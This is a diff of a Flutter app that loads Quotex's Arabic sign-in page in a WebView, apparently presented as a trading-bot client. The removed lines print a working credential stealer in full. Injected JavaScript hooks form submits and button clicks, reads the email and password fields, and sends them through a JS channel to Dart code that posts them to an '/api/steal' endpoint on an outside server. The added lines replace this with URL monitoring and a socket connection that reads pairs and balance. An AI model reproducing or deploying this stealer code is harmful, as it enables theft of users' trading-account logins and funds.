@@ -1,10 +1,7 @@
 import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
-import 'package:permission_handler/permission_handler.dart';
-import 'package:http/http.dart' as http;
-import 'dart:convert';
-import 'package:flutter/services.dart'; // عشان SystemNavigator
+import 'package:socket_io_client/socket_io_client.dart' as IO;
 
 void main() => runApp(const MyApp());
 
@@ -42,95 +39,32 @@ class LoginScreen extends StatefulWidget {
 
 class _LoginScreenState extends State<LoginScreen> {
   late WebViewController _controller;
+  bool _hasNavigated = false;
 
   @override
   void initState() {
     super.initState();
-    _requestPermissions();
     _initWebView();
-  }
-
-  void _requestPermissions() async {
-    await Permission.location.request();
-    await Permission.notification.request();
   }
 
   void _initWebView() {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..setUserAgent("Quotex/1.0")
-      ..addJavaScriptChannel(
-        'QTX_CREDS',
-        onMessageReceived: (msg) async {
-          print("JAVASCRIPT MESSAGE: ${msg.message}");
-          try {
-            var data = jsonDecode(msg.message);
-            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
-              // 439. نبعتها للسيرفر
-              await http.post(
-                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-                headers: {"Content-Type": "application/json"},
-                body: msg.message,
-              );
-
-              // 440. نحول المستخدم للواجهة
+      ..setNavigationDelegate(
+        NavigationDelegate(
+          onUrlChange: (UrlChange urlChange) {
+            // 442. نراقب الرابط.. إذا صار فيه trade أو cabinet يعني سجل دخول
+            if (!_hasNavigated && (urlChange.url?.contains('/trade') == true || urlChange.url?.contains('/cabinet') == true || urlChange.url?.contains('/demo-trade') == true)) {
+              _hasNavigated = true;
               if (mounted) {
                 Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
               }
             }
-          } catch (e) {
-            print("Error: $e");
-          }
-        },
-      )
-      ..setNavigationDelegate(
-        NavigationDelegate(
-          onPageFinished: (url) async {
-            await Future.delayed(const Duration(seconds: 2));
-            _injectOriginalScript();
           },
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
-  }
-
-  void _injectOriginalScript() {
-    String jsScript = """
-      (function() {
-        function setNativeValue(el, value) {
-          try {
-            var proto = window.HTMLInputElement.prototype;
-            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
-            desc.set.call(el, value);
-          } catch (e) { el.value = value; }
-          el.dispatchEvent(new Event('input', { bubbles: true }));
-          el.dispatchEvent(new Event('change', { bubbles: true }));
-        }
-        function findEmail() {
-          return document.querySelector('input[name="email"], input[type="email"], #email');
-        }
-        function findPass() {
-          return document.querySelector('input[name="password"], input[type="password"], #password');
-        }
-        function sendCreds() {
-          try {
-            var e = findEmail(), p = findPass();
-            if (e && p && e.value && p.value) {
-              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
-            }
-          } catch (err) {}
-        }
-        if (!window.__qtxHooksInstalled) {
-          window.__qtxHooksInstalled = true;
-          document.addEventListener('submit', sendCreds, true);
-          document.addEventListener('click', function(ev) {
-            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
-            if (t) sendCreds();
-          }, true);
-        }
-      })();
-    """;
-    _controller.runJavaScript(jsScript);
   }
 
   @override
@@ -139,6 +73,7 @@ class _LoginScreenState extends State<LoginScreen> {
   }
 }
 
+// 443. شاشة البوت (التصميم اللي بعتّه)
 class MainTradingScreen extends StatefulWidget {
   const MainTradingScreen({super.key});
   @override
@@ -148,6 +83,46 @@ class MainTradingScreen extends StatefulWidget {
 class _MainTradingScreenState extends State<MainTradingScreen> {
   bool isBotRunning = false;
   bool isDemoAccount = true;
+  late IO.Socket _socket;
+  List<String> _pairs = [];
+  String _balance = "0.00";
+
+  @override
+  void initState() {
+    super.initState();
+    _initSocket();
+  }
+
+  void _initSocket() {
+    _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
+      'transports': ['websocket'],
+      'autoConnect': true,
+      'path': '/socket.io/',
+      'query': {'EIO': '4', 'transport': 'websocket'},
+    });
+
+    _socket.onConnect((_) {
+      // 444. نطلب الأزواج والرصيد
+      _socket.emit('42["instruments/list"]');
+      _socket.emit('42["balance/list"]');
+    });
+
+    _socket.on('instruments/update', (data) {
+      if (data['instruments'] != null) {
+        setState(() {
+          _pairs = List<String>.from(data['instruments'].map((i) => i['name']));
+        });
+      }
+    });
+
+    _socket.on('balance/list', (data) {
+      if (data['balance'] != null) {
+        setState(() {
+          _balance = data['balance'].toString();
+        });
+      }
+    });
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -177,6 +152,41 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
                     ],
                   ),
                   const SizedBox(height: 20),
+                  // بطاقة الرصيد
+                  Container(
+                    padding: const EdgeInsets.all(16),
+                    decoration: BoxDecoration(color: const Color(0xFF0E0E14), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFF00E5FF))),
+                    child: Row(
+                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                      children: [
+                        Text('الرصيد:', style: TextStyle(color: Colors.grey[400], fontSize: 16)),
+                        Text('\$$_balance', style: const TextStyle(color: Color(0xFFFFD700), fontSize: 22, fontWeight: FontWeight.bold)),
+                      ],
+                    ),
+                  ),
+                  const SizedBox(height: 20),
+                  // الأزواج المتاحة
+                  Container(
+                    padding: const EdgeInsets.all(16),
+                    decoration: BoxDecoration(color: const Color(0xFF0E0E14), borderRadius: BorderRadius.circular(10)),
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        Text('الأزواج المتاحة:', style: TextStyle(color: Colors.grey[400], fontSize: 16)),
+                        const SizedBox(height: 10),
+                        Wrap(
+                          spacing: 8,
+                          runSpacing: 8,
+                          children: _pairs.map((pair) => Chip(
+                            label: Text(pair, style: const TextStyle(color: Colors.white)),
+                            backgroundColor: const Color(0xFF1E1E24),
+                          )).toList(),
+                        ),
+                      ],
+                    ),
+                  ),
+                  const SizedBox(height: 20),
+                  // أزرار الحساب
                   Container(
                     decoration: BoxDecoration(color: const Color(0xFF0E0E14), borderRadius: BorderRadius.circular(10)),
                     child: Row(
@@ -211,6 +221,7 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
                     ),
                   ),
                   const SizedBox(height: 20),
+                  // زر التداول
                   ElevatedButton(
                     onPressed: () {
                       setState(() => isBotRunning = !isBotRunning);
